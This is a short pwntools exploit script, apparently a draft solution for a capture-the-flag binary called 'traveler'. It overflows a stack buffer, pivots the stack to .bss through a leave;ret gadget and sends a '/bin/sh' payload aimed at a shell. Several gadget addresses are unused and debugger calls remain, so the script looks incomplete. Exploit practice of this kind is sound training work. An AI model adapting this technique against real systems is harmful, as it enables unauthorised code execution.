from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
p = process('./traveler')
elf = ELF('./traveler')

leave_ret = 0x0000000000401253
bss = 0x04040a0
main_addr = 0x4011F4
back_door = 0x4011DD
puts_plt = elf.plt['puts']
payload = b'a' * 0x20 + p64(bss) + p64(leave_ret)
p.recvuntil(b'who r u?')
p.send(payload)

pop_rdi = 0x00000000004012c3
system_addr = elf.sym['system']
system_addr = elf.plt['system']
ret = 0x000000000040101a

payload = b'/bin/sh\00' + b'a' * 200
p.recvuntil(b'How many travels can a person have in his life?')
gdb.attach(p)
pause()
p.send(payload)
p.interactive()
